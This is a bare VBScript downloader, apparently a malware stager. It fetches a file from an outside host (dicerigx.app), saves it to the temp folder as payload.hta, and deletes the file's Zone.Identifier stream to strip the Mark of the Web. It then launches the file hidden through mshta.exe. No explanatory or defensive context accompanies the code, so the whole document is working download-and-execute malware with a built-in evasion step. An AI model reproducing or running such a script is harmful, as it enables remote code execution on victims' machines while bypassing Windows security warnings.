Dim xh, fso, sh, path
Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")

path = sh.ExpandEnvironmentStrings("%TEMP%") & "\payload.hta"

xh.Open "GET", "https://dicerigx.app/", False
xh.Send

If xh.Status = 200 Then
    Dim st : Set st = CreateObject("ADODB.Stream")
    st.Type = 1
    st.Open
    st.Write xh.responseBody
    st.SaveToFile path, 2
    st.Close
    
    ' Strip MOTW
    On Error Resume Next
    fso.DeleteFile path & ":Zone.Identifier", True
    On Error GoTo 0
    
    ' Force mshta to run the local file
    sh.Run "mshta.exe """ & path & """", 0, False
End If
